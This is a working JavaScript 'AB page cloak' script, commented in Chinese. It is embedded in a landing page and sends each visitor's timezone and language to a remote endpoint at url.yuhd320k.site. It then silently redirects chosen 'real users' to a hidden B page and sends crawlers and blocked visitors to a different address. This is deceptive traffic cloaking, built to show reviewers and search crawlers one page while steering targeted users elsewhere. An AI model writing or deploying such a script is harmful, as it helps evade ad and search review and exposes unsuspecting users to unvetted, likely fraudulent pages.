/* AB页+斗篷 守卫脚本（静态，接入 A 页 <head>）
 * 接入：<script src="https://url.yuhd320k.site/ab-cloak.js"></script>
 * 落地即跳：页面加载后立即判定，真实用户跳 B 页，爬虫/被屏蔽跳「不符合规则地址」。 */
(function () {
  try {
    var cs = document.currentScript;
    var API_BASE = 'https://url.yuhd320k.site';
    if (cs && cs.src) { var k = cs.src.indexOf('/', 8); if (k > 0) API_BASE = cs.src.slice(0, k); }
    var SITE = location.origin + location.pathname; // 不含查询参数，便于精确定位 A 页

    var DEBUG = false;
    try {
      if (cs && cs.src && cs.src.indexOf('debug=1') !== -1) DEBUG = true;
      if (location.search.indexOf('ab_debug=1') !== -1) DEBUG = true;
    } catch (e) {}
    function dbg(m) { try { console.log('[ab-cloak]', m); } catch (e) {} }

    var tzOffset = -new Date().getTimezoneOffset() / 60; // 东正，中国 = +8
    var tzIANA = '';
    try { tzIANA = Intl.DateTimeFormat().resolvedOptions().timeZone || ''; } catch (e) {}
    var lang = (navigator.language || navigator.userLanguage || '');

    dbg('AB页斗篷脚本已加载 ✓ 站点: ' + SITE);

    fetch(API_BASE + '/api/ab-cloak', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ site: SITE, client: { timezoneOffset: tzOffset, timezoneIANA: tzIANA, lang: lang } })
    })
      .then(function (r) { return r.json(); })
      .then(function (d) {
        if (d && d.redirect) {
          dbg('跳转 → ' + d.redirect);
          try { location.replace(d.redirect); } catch (err) { location.href = d.redirect; }
        } else {
          dbg('不跳转（未配置/未开通/白名单外判定通过）');
        }
      })
      .catch(function (e) { dbg('网络异常，不跳转: ' + (e && e.message ? e.message : e)); });
  } catch (e) {}
})();
